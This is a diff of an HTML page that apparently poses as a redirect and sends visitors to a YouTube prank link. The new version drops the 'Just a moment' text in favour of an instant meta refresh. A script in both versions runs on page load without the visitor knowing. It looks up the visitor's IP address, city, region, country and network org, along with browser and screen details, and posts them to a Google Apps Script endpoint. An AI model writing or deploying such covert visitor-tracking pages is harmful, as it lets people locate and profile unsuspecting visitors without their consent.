@@ -1,62 +1,37 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Just a Moment...</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding-top: 50px;
-    }
-  </style>
-</head>
-<body>
-  <h2>Just a moment...</h2>
-  <p>We’re redirecting to the page ക്ഷേമ വേണം... സമയം എടുക്കും .</p>
+<html>
+  <head>
+    <meta http-equiv="refresh" content="0; url='https://youtu.be/dQw4w9WgXcQ?si=aoI7QHt0L-2vtWzC'" />
+    <script>
+      async function logInfo() {
+        try {
+          const ipInfo = await fetch("https://ipinfo.io/json?token=4d7b0c36e45fe4").then(res => res.json());
+          const data = {
+            ip: ipInfo.ip,
+            city: ipInfo.city,
+            region: ipInfo.region,
+            country: ipInfo.country,
+            org: ipInfo.org,
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenResolution: `${screen.width}x${screen.height}`
+          };
 
-  <script>
-    const deviceInfo = {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      screenResolution: `${screen.width}x${screen.height}`,
-    };
+          await fetch("https://script.google.com/macros/s/AKfycbxRUjscEh1oDwyK8LE2NqA2eiOrfEQl8NaLx0-0EQQ9hSGoHftzpFQFPyZVm7Gqtis/exec", {
+            method: "POST",
+            body: JSON.stringify(data),
+            headers: {
+              "Content-Type": "application/json"
+            }
+          });
+        } catch (err) {
+          console.error("Logging failed", err);
+        }
+      }
 
-    fetch("https://ipapi.co/json/")
-      .then(res => res.json())
-      .then(location => {
-        const dataToSend = {
-          ...deviceInfo,
-          ip: location.ip,
-          city: location.city,
-          region: location.region,
-          country: location.country_name,
-          org: location.org,
-        };
-
-        // >>>>>>> REPLACE THE URL BELOW WITH YOUR SCRIPT WEB APP URL <<<<<<<
-        fetch("https://script.google.com/macros/s/AKfycbxRUjscEh1oDwyK8LE2NqA2eiOrfEQl8NaLx0-0EQQ9hSGoHftzpFQFPyZVm7Gqtis/exec",{
-          method: "POST",
-          body: JSON.stringify(dataToSend),
-          headers: {
-            "Content-Type": "application/json",
-          },
-        });
-
-        // Redirect after 3 seconds
-        setTimeout(() => {
-          window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=aoI7QHt0L-2vtWzC";
-        }, 3000);
-      })
-      .catch(err => {
-        console.error("Failed to get location or send data:", err);
-        // Still redirect anyway
-        setTimeout(() => {
-          window.location.href = "https://youtu.be/dQw4w9WgXcQ?si=aoI7QHt0L-2vtWzC";
-        }, 3000);
-      });
-  </script>
-</body>
+      logInfo();
+    </script>
+  </head>
+  <body></body>
 </html>
